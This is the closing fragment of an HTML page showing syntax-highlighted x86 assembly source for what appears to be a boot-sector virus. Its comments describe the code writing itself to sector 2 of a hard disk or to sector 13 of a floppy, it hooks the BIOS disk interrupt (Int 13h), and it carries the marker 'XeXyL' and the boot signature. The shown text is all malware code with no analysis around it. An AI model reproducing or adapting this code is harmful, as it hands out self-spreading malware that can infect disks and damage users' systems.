</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                               </span><span class="sc1">;pop all from stack</span><span class="sc0">
</span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">;done</span><span class="sc0">




</span><span class="sc5">ChooseSector</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;We write us to sector 2</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">HDD</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;If its a floppy</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                            </span><span class="sc1">;write us last head 1</span><span class="sc0">
</span><span class="sc5">HDD</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;sector 13</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Int13</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;push flags register</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt13</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Point to our 13h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;return to caller               </span><span class="sc0">
</span><span class="sc5">XeXyl</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"XeXyL"</span><span class="sc0">                      </span><span class="sc1">;Marker </span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">1feh</span><span class="sc0">                                </span><span class="sc1">;End of first sector</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">                            </span><span class="sc1">;Signature that is needed for disk</span><span class="sc0">
                                        </span><span class="sc1">;to be read</span><span class="sc0">
</span><span class="sc5">XeXyLSeg</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">        </span><span class="sc5">begin</span><span class="sc0">                        

</span></div></body>
</html>
